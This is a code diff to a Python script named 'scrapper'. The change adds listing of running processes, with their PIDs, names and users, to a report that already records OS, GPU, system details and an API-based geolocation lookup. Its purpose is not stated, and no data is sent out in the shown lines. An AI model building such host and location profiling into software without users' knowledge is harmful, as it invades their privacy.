@@ -5,6 +5,7 @@ import time
 import requests
 from datetime import datetime
 import os
+import psutil
 
 def get_os_info():
     return platform.platform()
@@ -54,6 +55,17 @@ def get_gpu_info():
     except Exception as e:
         gpu_info = f"Error retrieving GPU Info: {e}"
     return gpu_info
+
+def get_running_processes():
+    running_processes = psutil.process_iter(['pid', 'name', 'username'])
+    process_info = []
+    for proc in running_processes:
+        process_info.append({
+            "PID": proc.info['pid'],
+            "Name": proc.info['name'],
+            "Username": proc.info['username']
+        })
+    return process_info
 
 def get_location_from_api(api_token):
     try:
@@ -108,6 +120,12 @@ def scrapper():
                 break  # Stop if there's an error
         file.write("\n============================\n")
 
+        file.write("Running Processes:\n\n")
+        running_processes = get_running_processes()
+        for proc in running_processes:
+            file.write(f"PID: {proc['PID']}, Name: {proc['Name']}, User: {proc['Username']}\n\n")
+        
+        file.write("\n============================\n")
         file.write("System Information:\n")
         os_info = get_os_info()
         system_details = get_system_details()
